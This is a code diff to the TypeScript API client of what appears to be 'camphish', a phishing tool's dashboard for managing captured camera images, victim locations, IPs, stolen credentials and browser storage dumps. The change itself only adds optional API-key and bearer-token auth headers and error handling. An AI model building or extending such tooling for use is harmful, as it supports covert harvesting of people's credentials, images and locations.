@@ -1,8 +1,45 @@
 const API = '/api'
 
+/* ───── Optional M2M auth (localStorage overrides) ───── */
+function authHeaders(): HeadersInit {
+  const h: Record<string, string> = { 'X-Requested-With': 'XMLHttpRequest' }
+  const apiKey = localStorage.getItem('camphish-api-key')
+  if (apiKey) {
+    h['X-API-Key'] = apiKey
+  }
+  const bearer = localStorage.getItem('camphish-bearer-token')
+  if (bearer) {
+    h['Authorization'] = `Bearer ${bearer}`
+  }
+  return h
+}
+
+function mergeHeaders(base: HeadersInit | undefined): HeadersInit {
+  const merged = new Headers(authHeaders())
+  if (base) {
+    const b = new Headers(base)
+    b.forEach((v, k) => merged.set(k, v))
+  }
+  return merged
+}
+
+async function handleAuthError(r: Response): Promise<string> {
+  if (r.status === 401 || r.status === 403) {
+    const body = await r.text().catch(() => '')
+    try {
+      const json = JSON.parse(body)
+      if (json.message) return `${r.status}: ${json.message}`
+    } catch { /* not json */ }
+    return `${r.status}: Authentication required — please log in with a valid access code or configure an API key/OAuth token.`
+  }
+  return ''
+}
+
 async function fetchJson<T>(url: string): Promise<T> {
-  const r = await fetch(url)
+  const r = await fetch(url, { headers: authHeaders() })
   if (!r.ok) {
+    const authMsg = await handleAuthError(r)
+    if (authMsg) throw new Error(authMsg)
     const body = await r.text().catch(() => '')
     throw new Error(body ? `${r.status}: ${body.slice(0, 200)}` : `${r.status} ${r.statusText}`)
   }
@@ -10,15 +47,13 @@ async function fetchJson<T>(url: string): Promise<T> {
 }
 
 async function fetchNoContent(url: string, init: RequestInit): Promise<void> {
-  const r = await fetch(url, init)
+  const r = await fetch(url, { ...init, headers: mergeHeaders(init.headers) })
   if (!r.ok) {
+    const authMsg = await handleAuthError(r)
+    if (authMsg) throw new Error(authMsg)
     const body = await r.text().catch(() => '')
     throw new Error(body ? `${r.status}: ${body.slice(0, 200)}` : `${r.status} ${r.statusText}`)
   }
-}
-
-function csrfHeaders(): HeadersInit {
-  return { 'X-Requested-With': 'XMLHttpRequest' }
 }
 
 export interface Stats {
@@ -126,42 +161,6 @@ export interface PaginatedResponse<T> {
   has_more: boolean
 }
 
-export const api = {
-  stats: () => fetchJson<Stats>(`${API}/stats`),
-  captures: (page = 1, perPage = 60, sort = 'newest') =>
-    fetchJson<PaginatedCaptures>(`${API}/captures?page=${page}&per_page=${perPage}&sort=${sort}`),
-  deleteCapture: (id: string) =>
-    fetchNoContent(`${API}/captures/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
-  deleteAllCaptures: () =>
-    fetchNoContent(`${API}/captures`, { method: 'DELETE', headers: csrfHeaders() }),
-  locations: (offset = 0, limit = 50, session = '') =>
-    fetchJson<PaginatedResponse<Location>>(`${API}/locations?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
-  deleteAllLocations: () => fetchNoContent(`${API}/locations`, { method: 'DELETE', headers: csrfHeaders() }),
-  ips: (offset = 0, limit = 50, session = '') =>
-    fetchJson<IpStats>(`${API}/ips?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
-  deleteAllIps: () => fetchNoContent(`${API}/ips`, { method: 'DELETE', headers: csrfHeaders() }),
-  templates: () => fetchJson<Template[]>(`${API}/templates`),
-  events: (session = '', offset = 0, limit = 50) =>
-    fetchJson<PaginatedResponse<EventRow>>(`${API}/events?${session ? `session=${session}&` : ''}offset=${offset}&limit=${limit}`),
-  deleteAllEvents: () => fetchNoContent(`${API}/events`, { method: 'DELETE', headers: csrfHeaders() }),
-  sessions: () => fetchJson<Session[]>(`${API}/sessions`),
-  createSession: (name: string, templateId: string): Promise<Session> =>
-    fetch(`${API}/sessions`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', ...csrfHeaders() },
-      body: JSON.stringify({ name, template_id: templateId })
-    }).then(r => { if (!r.ok) throw new Error('Failed to create session'); return r.json() }),
-  deleteSession: (id: string) => fetchNoContent(`${API}/sessions/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
-  credentials: (offset = 0, limit = 50, session = '') =>
-    fetchJson<PaginatedResponse<Credential>>(`${API}/credentials?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
-  deleteCredential: (id: string) => fetchNoContent(`${API}/credentials/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
-  deleteAllCredentials: () => fetchNoContent(`${API}/credentials`, { method: 'DELETE', headers: csrfHeaders() }),
-  storage: (offset = 0, limit = 50, session = '') =>
-    fetchJson<PaginatedResponse<StorageDump>>(`${API}/storage?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
-  deleteStorage: (id: string) => fetchNoContent(`${API}/storage/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
-  deleteAllStorage: () => fetchNoContent(`${API}/storage`, { method: 'DELETE', headers: csrfHeaders() }),
-}
-
 export interface StorageDump {
   id: string
   session_id: string
@@ -180,4 +179,47 @@ export interface Credential {
   phone: string | null
   ip_address: string | null
   created_at: number
+}
+
+export const api = {
+  stats: () => fetchJson<Stats>(`${API}/stats`),
+  captures: (page = 1, perPage = 60, sort = 'newest') =>
+    fetchJson<PaginatedCaptures>(`${API}/captures?page=${page}&per_page=${perPage}&sort=${sort}`),
+  deleteCapture: (id: string) =>
+    fetchNoContent(`${API}/captures/${id}`, { method: 'DELETE' }),
+  deleteAllCaptures: () =>
+    fetchNoContent(`${API}/captures`, { method: 'DELETE' }),
+  locations: (offset = 0, limit = 50, session = '') =>
+    fetchJson<PaginatedResponse<Location>>(`${API}/locations?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
+  deleteAllLocations: () => fetchNoContent(`${API}/locations`, { method: 'DELETE' }),
+  ips: (offset = 0, limit = 50, session = '') =>
+    fetchJson<IpStats>(`${API}/ips?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
+  deleteAllIps: () => fetchNoContent(`${API}/ips`, { method: 'DELETE' }),
+  templates: () => fetchJson<Template[]>(`${API}/templates`),
+  events: (session = '', offset = 0, limit = 50) =>
+    fetchJson<PaginatedResponse<EventRow>>(`${API}/events?${session ? `session=${session}&` : ''}offset=${offset}&limit=${limit}`),
+  deleteAllEvents: () => fetchNoContent(`${API}/events`, { method: 'DELETE' }),
+  sessions: () => fetchJson<Session[]>(`${API}/sessions`),
+  createSession: (name: string, templateId: string): Promise<Session> =>
+    fetch(`${API}/sessions`, {
+      method: 'POST',
+      headers: mergeHeaders({ 'Content-Type': 'application/json' }),
+      body: JSON.stringify({ name, template_id: templateId })
+    }).then(async r => {
+      if (!r.ok) {
+        const authMsg = await handleAuthError(r)
+        if (authMsg) throw new Error(authMsg)
+        throw new Error('Failed to create session')
+      }
+      return r.json()
+    }),
+  deleteSession: (id: string) => fetchNoContent(`${API}/sessions/${id}`, { method: 'DELETE' }),
+  credentials: (offset = 0, limit = 50, session = '') =>
+    fetchJson<PaginatedResponse<Credential>>(`${API}/credentials?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
+  deleteCredential: (id: string) => fetchNoContent(`${API}/credentials/${id}`, { method: 'DELETE' }),
+  deleteAllCredentials: () => fetchNoContent(`${API}/credentials`, { method: 'DELETE' }),
+  storage: (offset = 0, limit = 50, session = '') =>
+    fetchJson<PaginatedResponse<StorageDump>>(`${API}/storage?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
+  deleteStorage: (id: string) => fetchNoContent(`${API}/storage/${id}`, { method: 'DELETE' }),
+  deleteAllStorage: () => fetchNoContent(`${API}/storage`, { method: 'DELETE' }),
 }
